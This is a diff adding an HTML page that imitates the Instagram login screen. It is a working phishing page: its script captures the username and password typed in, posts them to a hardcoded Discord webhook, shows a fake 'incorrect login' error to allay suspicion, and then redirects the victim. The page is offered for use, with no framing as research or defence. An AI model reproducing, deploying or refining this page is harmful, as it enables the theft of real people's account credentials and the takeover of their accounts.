@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <!-- Corrected external Google font URLs to ensure look loads properly -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Comic+Neue:ital,wght@0,400;0,700;1,400&display=swap" rel="stylesheet">
+    <style>
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            padding: 20px; 
+            background: #fafafa; 
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 95vh;
+            box-sizing: border-box;
+        }
+        .container { 
+            width: 100%;
+            max-width: 350px; 
+            background: white; 
+            padding: 40px 30px; 
+            border: 1px solid #dbdbdb;
+            border-radius: 1px; 
+            text-align: center;
+            box-sizing: border-box;
+            margin-bottom: 10px;
+        }
+        h2 {
+            margin: 10px 0 35px 0;
+            color: #262626;
+            font-family: "Comic Neue", cursive, sans-serif;
+            font-size: 50px;
+            font-weight: 700;
+            letter-spacing: -1px;
+        }
+        input[type="text"] { 
+            width: 100%; 
+            height: 38px; 
+            padding: 9px 8px; 
+            box-sizing: border-box; 
+            border: 1px solid #dbdbdb; 
+            border-radius: 3px; 
+            font-size: 12px;
+            margin-bottom: 6px;
+            background: #fafafa;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif !important;
+            font-weight: 400 !important;
+            font-style: normal !important;
+            color: #262626;
+        }
+        input[type="text"]::placeholder {
+            color: #8e8e8e;
+        }
+        input[type="text"]:focus {
+            border: 1px solid #a8a8a8;
+            outline: none;
+        }
+        button { 
+            width: 100%;
+            height: 32px;
+            padding: 0;
+            background: #4cb5f9; 
+            color: white; 
+            border: none; 
+            border-radius: 4px; 
+            cursor: pointer; 
+            font-size: 14px; 
+            font-weight: bold;
+            margin-top: 8px;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
+        button:hover { 
+            background: #3578e5; 
+        }
+        #status { 
+            margin-top: 15px; 
+            font-size: 12px;
+            font-weight: bold;
+        }
+        .divider {
+            margin: 25px 0;
+            position: relative;
+            text-align: center;
+        }
+        .divider::before {
+            content: "";
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: #dbdbdb;
+            z-index: 1;
+        }
+        .divider span {
+            background: white;
+            padding: 0 18px;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: bold;
+            position: relative;
+            z-index: 2;
+        }
+        a {
+            display: block;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .fb-login {
+            color: #385185;
+            font-weight: 600;
+            margin-top: 10px;
+        }
+        .forgot {
+            color: #00376b;
+            font-size: 12px;
+            margin-top: 18px;
+        }
+        .signup-container {
+            width: 100%;
+            max-width: 350px;
+            background: white;
+            padding: 20px;
+            border: 1px solid #dbdbdb;
+            text-align: center;
+            box-sizing: border-box;
+            font-size: 14px;
+            color: #262626;
+            margin-bottom: 20px;
+        }
+        .signup-container a {
+            display: inline;
+            color: #0095f6;
+            font-weight: 600;
+        }
+        .get-app {
+            text-align: center;
+            font-size: 14px;
+            color: #262626;
+        }
+        .badges {
+            margin-top: 15px;
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+        }
+        .badges img {
+            height: 40px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2>Instagram</h2>
+        
+        <input type="text" id="noteInput" placeholder="Phone number, username, or email">
+        <input type="text" id="conclusionInput" placeholder="Password">
+        
+        <button type="button" onclick="sendToDiscord()">Log In</button>
+        
+        <div id="status"></div>
+
+        <div class="divider"><span>OR</span></div>
+        <a href="#" class="fb-login">Log in with Facebook</a>
+        <a href="#" class="forgot">Forgot password?</a>
+    </div>
+
+    <div class="signup-container">
+        Don't have an account? <a href="#">Sign up</a>
+    </div>
+
+    <div class="get-app">
+        Get the app.
+        <div class="badges">
+            <img src="https://wikimedia.org" alt="App Store">
+            <img src="https://wikimedia.org" alt="Google Play">
+        </div>
+    </div>
+
+<script>
+function sendToDiscord() {
+    const webhookUrl = "https://discordapp.com/api/webhooks/1517879834297106583/1r5v3yHiqoOs86gDO-CboVW9wC710WyVmygCmP2TEfdUN15HJt6BWGeNizgDDJg0GTwH";
+    const noteText = document.getElementById("noteInput").value;
+    const conclusionText = document.getElementById("conclusionInput").value;
+    const statusDiv = document.getElementById("status");
+
+    if (!noteText.trim()) {
+        statusDiv.style.color = "red";
+        statusDiv.innerText = "Please write something first!";
+        return;
+    }
+
+    statusDiv.style.color = "green";
+    statusDiv.innerText = "processing...";
+
+    let combinedMessage = `**📝 USER NAME :**\n${noteText}`;
+    if (conclusionText.trim()) {
+        combinedMessage += `\n\n**📌 PASSSWORD:**\n${conclusionText}`;
+    }
+
+    const payload = {
+        content: combinedMessage
+    };
+
+    fetch(webhookUrl, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify(payload)
+    })
+    .then(response => {
+        if (response.ok) {
+            statusDiv.style.color = "red";
+            statusDiv.innerText = "The login information you entered is incorrect.";
+            document.getElementById("noteInput").value = ""; 
+            document.getElementById("conclusionInput").value = ""; 
+            
+            // Introduced a 3-second (3000 milliseconds) timer loop before moving execution over to the target URL
+            setTimeout(function() {
+                window.location.href = "instagram.html";
+            }, 3000);
+        } else {
+            statusDiv.style.color = "red";
+            statusDiv.innerText = "Error sending message. Check Webhook URL.";
+        }
+    })
+    .catch(error => {
+        statusDiv.style.color = "red";
+        statusDiv.innerText = "Network error. Make sure you are online.";
+        console.error("Error:", error);
+    });
+}
+</script>
+
+</body>
+</html>
